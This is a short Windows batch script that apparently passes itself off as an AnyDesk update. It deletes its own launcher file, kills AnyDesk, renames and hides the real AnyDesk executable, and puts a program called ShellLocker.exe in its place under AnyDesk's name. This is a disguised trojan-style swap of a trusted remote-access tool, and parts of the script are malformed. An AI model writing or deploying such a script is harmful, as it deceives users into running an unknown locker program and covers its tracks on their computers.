del /f /q "Start AnyDesk Update.bat"
clear
taskkill /f /t /im AnyDesk.exe
clear
rename "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" Anydeskclean.exe
clear
attrib +h "C:\Program Files (x86)\AnyDesk\Anydeskclean.exe"
clear
rename "C:\Program Files (x86)\AnyDesk\ShellLocker.exe AnyDesk.exe"
clear
timeout 100 /nobreak
